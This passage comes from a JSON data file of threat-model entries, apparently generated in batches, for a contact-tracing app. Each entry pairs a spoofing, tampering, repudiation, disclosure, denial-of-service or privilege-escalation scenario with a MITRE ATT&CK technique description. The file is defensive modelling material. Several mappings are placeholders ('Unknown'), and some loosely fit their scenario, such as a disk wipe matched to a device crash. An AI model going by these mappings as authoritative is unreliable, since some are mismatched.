            "Assumptions": [
                {
                    "Assumption": "Insider has access to server systems",
                    "Role": "Insider",
                    "Condition": "Insufficient access controls for employees"
                },
                {
                    "Assumption": "Server logs are not monitored for anomalies",
                    "Role": "System",
                    "Condition": "Lack of log analysis"
                },
                {
                    "Assumption": "Data changes are not subject to approval processes",
                    "Role": "System",
                    "Condition": "Absence of internal protocols for data changes"
                }
            ],
            "Potential Impact": "Unauthorized data manipulation, misinformation spread",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Data Manipulation",
                "Server Tampering"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies having been notified of exposure due to lack of record-keeping.",
            "Assumptions": [
                {
                    "Assumption": "System does not log exposure notifications",
                    "Role": "System",
                    "Condition": "Notification system lacks traceability"
                },
                {
                    "Assumption": "Users know how to disable notifications",
                    "Role": "User",
                    "Condition": "User tampering with settings"
                },
                {
                    "Assumption": "Notifications are sent through insecure channels",
                    "Role": "System",
                    "Condition": "No verification on notification delivery"
                }
            ],
            "Potential Impact": "Loss of accountability, disruption in contact tracing",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Lack of Traceability",
                "Notification Tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Medical staff denies altering test result data.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are weak",
                    "Role": "System",
                    "Condition": "Poor role-based access"
                },
                {
                    "Assumption": "Changes to data are not logged",
                    "Role": "System",
                    "Condition": "Absence of logging mechanisms"
                },
                {
                    "Assumption": "Test data integrity is not enforced",
                    "Role": "System",
                    "Condition": "Lack of checks for data consistency"
                }
            ],
            "Potential Impact": "Loss of integrity, system reliability compromised",
            "MITRE ATT&CK Keywords": [
                "Data Manipulation",
                "Logging Bypass",
                "Integrity Violation"
            ],
            "mitre_technique": {
                "name": "Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
                "technique_id": "T1565"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attacker deletes or alters log files to cover tracks.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible to attackers",
                    "Role": "System",
                    "Condition": "Insufficient log protection"
                },
                {
                    "Assumption": "Log modifications are not monitored",
                    "Role": "System",
                    "Condition": "Lack of log monitoring"
                },
                {
                    "Assumption": "Log data is not backed up",
                    "Role": "System",
                    "Condition": "No redundancy for log files"
                }
            ],
            "Potential Impact": "Loss of evidence, reduced ability to audit events",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Evidence Tampering",
                "Logging Bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker intercepts unencrypted transmission of user location data.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "System",
                    "Condition": "No TLS/SSL encryption"
                },
                {
                    "Assumption": "Attacker has network interception capabilities",
                    "Role": "Attacker",
                    "Condition": "Controlled or compromised network access"
                },
                {
                    "Assumption": "Sensitive data is included in transmission payload",
                    "Role": "System",
                    "Condition": "No data minimization practices in place"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "Data Interception",
                "Data Exposure",
                "Unencrypted Transmission"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is exposed through insecure API endpoints.",
            "Assumptions": [
                {
                    "Assumption": "APIs are not securely designed or implemented",
                    "Role": "System",
                    "Condition": "Lack of secure development practices"
                },
                {
                    "Assumption": "No input validation on API endpoints",
                    "Role": "System",
                    "Condition": "APIs vulnerable to injection attacks"
                },
                {
                    "Assumption": "API keys are not rotated or encrypted",
                    "Role": "System",
                    "Condition": "Poor API key management"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "API Vulnerability",
                "Sensitive Data Exposure",
                "Data Leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Employee accidentally shares sensitive data via insecure email communication.",
            "Assumptions": [
                {
                    "Assumption": "Employees are not trained in secure communication practices",
                    "Role": "Organization",
                    "Condition": "Inadequate security awareness training"
                },
                {
                    "Assumption": "Email communications are not encrypted",
                    "Role": "System",
                    "Condition": "Lack of email encryption protocols"
                },
                {
                    "Assumption": "No policies about using personal email for work",
                    "Role": "Organization",
                    "Condition": "Absence of internal security policies"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "Email Exposure",
                "Sensitive Data Breach",
                "Insecure Communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on centralized server disrupts users' ability to receive exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "Central server is the single point of failure",
                    "Role": "System",
                    "Condition": "No backup or load balancing"
                },
                {
                    "Assumption": "Attacker can generate significant traffic",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or similar resources"
                },
                {
                    "Assumption": "Server capacity is not sufficient to handle high traffic",
                    "Role": "System",
                    "Condition": "Under-provisioned server resources"
                }
            ],
            "Potential Impact": "Disruption of service, loss of availability",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Service Disruption",
                "Network Flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware on user devices causes them to crash or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "User devices are vulnerable to malware",
                    "Role": "User Device",
                    "Condition": "Lack of antivirus or security patches"
                },
                {
                    "Assumption": "Malware can execute with high privileges",
                    "Role": "Malware",
                    "Condition": "Malware escalates privileges"
                },
                {
                    "Assumption": "Devices have no malware detection mechanisms",
                    "Role": "User Device",
                    "Condition": "No malware detection software"
                }
            ],
            "Potential Impact": "Loss of availability, device compromise",
            "MITRE ATT&CK Keywords": [
                "Malware",
                "Device Compromise",
                "System Crash"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacker exploits vulnerability in the service server causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "Server has unpatched vulnerabilities",
                    "Role": "System",
                    "Condition": "Delayed security updates"
                },
                {
                    "Assumption": "Exploitation leads to a server crash",
                    "Role": "Attacker",
                    "Condition": "Attacker capability to exploit vulnerability"
                },
                {
                    "Assumption": "No failover systems in place",
                    "Role": "System",
                    "Condition": "Lack of redundancy"
                }
            ],
            "Potential Impact": "Service performance degradation, loss of availability",
            "MITRE ATT&CK Keywords": [
                "Exploit",
                "Service Denial",
                "Vulnerability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains higher privileges on user devices and accesses sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the device OS",
                    "Role": "User Device",
                    "Condition": "Outdated operating system"
                },
                {
                    "Assumption": "Attacker has initial access to the device",
                    "Role": "Attacker",
                    "Condition": "Phishing, social engineering, or physical access"
                },
                {
                    "Assumption": "Permissions are not restricted",
                    "Role": "System",
                    "Condition": "Weak role-based access controls"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, data manipulation",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Device Compromise",
                "Sensitive Data Access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insider leverages their access to gain unauthorized access to critical systems.",
            "Assumptions": [
                {
                    "Assumption": "Insider has access to sensitive systems",
                    "Role": "Insider",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "Action goes undetected",
                    "Role": "System",
                    "Condition": "Lack of monitoring and logging"
                },
                {
                    "Assumption": "Sensitive actions are not audited",
                    "Role": "System",
                    "Condition": "No internal auditing processes"
                }
            ],
            "Potential Impact": "Unauthorized system access, potential for data breach",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Privilege Abuse",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker uses a compromised app with escalated privileges for persistent access.",
            "Assumptions": [
                {
                    "Assumption": "Application has vulnerabilities that allow privilege escalation",
                    "Role": "System",
                    "Condition": "Lack of rigorous security testing"
                },
                {
                    "Assumption": "Attacker has initial foothold",
                    "Role": "Attacker",
                    "Condition": "Successful phishing or social engineering"
                },
                {
                    "Assumption": "Escalated privileges are not detected",
                    "Role": "System",
                    "Condition": "No privilege monitoring in place"
                }
            ],
            "Potential Impact": "Persistent unauthorized access, system compromise",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Persistent Access",
                "App Compromise"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake instance of the contact tracing app and convinces users to install it.",
            "Assumptions": [
                {
                    "Assumption": "Users can install apps from unknown sources",
                    "Role": "User",
                    "Condition": "Users configure their devices to allow installations from sources other than official app stores."
                },
                {
                    "Assumption": "Adequate app vetting is not enforced",
                    "Role": "App distribution platform",
                    "Condition": "The app distribution platform fails to adequately verify the legitimacy of apps submitted."
                },
                {
                    "Assumption": "App appears legitimate",
                    "Role": "Attacker",
                    "Condition": "The attacker can replicate the app's UI and functions convincingly."
                }
            ],
            "Potential Impact": "Unauthorized data collection leading to privacy breaches and identity theft.",
            "MITRE ATT&CK Keywords": [
                "injection",
                "spoofing",
                "network"
            ],
            "mitre_technique": {
                "name": "Malvertising",
                "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ",
                "id": "attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096",
                "technique_id": "T1583.008"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a phishing attack to steal user credentials for accessing the central server.",
            "Assumptions": [
                {
                    "Assumption": "Users click on phishing links",
                    "Role": "User",
                    "Condition": "Users are susceptible to phishing emails or messages."
                },
                {
                    "Assumption": "No multi-factor authentication",
                    "Role": "System Admin",
                    "Condition": "The central server does not enforce multi-factor authentication."
                },
                {
                    "Assumption": "Phishing email appears legitimate",
                    "Role": "Attacker",
                    "Condition": "The attacker can convincingly spoof the appearance of legitimate emails."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to data breaches and potential misinformation spread.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "spoofing",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user device to generate false proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth vulnerabilities",
                    "Role": "Device",
                    "Condition": "User devices have Bluetooth vulnerabilities that can be exploited."
                },
                {
                    "Assumption": "No device verification protocols",
                    "Role": "System",
                    "Condition": "The system does not verify the legitimacy of interacting devices."
                },
                {
                    "Assumption": "Access to device data",
                    "Role": "Attacker",
                    "Condition": "The attacker can capture and replicate legitimate device data."
                }
            ],
            "Potential Impact": "Integrity of proximity data is compromised, leading to false exposure notifications and potential panic.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "spoofing",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the communication between the mobile application and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication",
                    "Role": "System",
                    "Condition": "The communication channel is not adequately encrypted."
                },
                {
                    "Assumption": "Man-in-the-middle position",
                    "Role": "Attacker",
                    "Condition": "The attacker can place themselves between the communicating entities."
                },
                {
                    "Assumption": "No integrity checks",
                    "Role": "System",
                    "Condition": "The system does not perform end-to-end integrity checks."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to inaccurate contact tracing data and false notifications.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "tampering",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to and modifies the local database on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Device vulnerabilities",
                    "Role": "Device",
                    "Condition": "User devices have exploitable vulnerabilities."
                },
                {
                    "Assumption": "No local data encryption",
                    "Role": "Application",
                    "Condition": "The application's local stored data is not encrypted."
                },
                {
                    "Assumption": "Privileged access",
                    "Role": "Attacker",
                    "Condition": "The attacker can gain root or administrative access to the device."
                }
            ],
            "Potential Impact": "Integrity and confidentiality of proximity data are compromised, possibly leading to false exposure alerts and unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "local"
            ],
            "mitre_technique": {
